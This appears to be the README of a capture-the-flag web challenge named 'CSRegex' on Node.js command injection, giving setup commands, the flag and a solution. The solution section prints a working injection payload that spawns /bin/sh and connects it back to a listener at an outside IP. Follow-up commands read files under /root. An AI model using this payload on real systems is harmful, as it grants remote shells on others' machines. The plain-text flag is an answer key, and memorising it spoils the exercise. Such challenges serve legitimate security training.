CSRegex
=========

## Status
* Meta: Done
* Tech: Done

## Description
Node.js command injection

## CTF Description
Stop pwning, start learning REGEX! This is such a fine way to ESCAPE the real world...

## Infos

* Author: molatho
* Ports: 9876
* Category: web
* For Downloading: -
* Flag: CSR{r363x_15_fun_r363x_15_l0v3}
* Points: 100


## Docker
Build (`docker build . -t molatho/csregex:0.1`) and run (`docker run -p80:8080 -d molatho/csregex:0.1`).

## Get Reverse Shell
Enter this payload as "Input":
```
'; 
Promise.all([LEGACY_UTILS.require('net'), LEGACY_UTILS.require('child_process')])
.then(res => {
var sh = res[1].spawn('/bin/sh', []);
var client = new res[0].Socket();
    client.connect(6666, "172.22.73.253", function(){ /* target Port, IP */
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/
});
//
```

## Acquire flag
```
ls -la /root
curl file:///root/flaggerino_flaggeroni.toxt
```
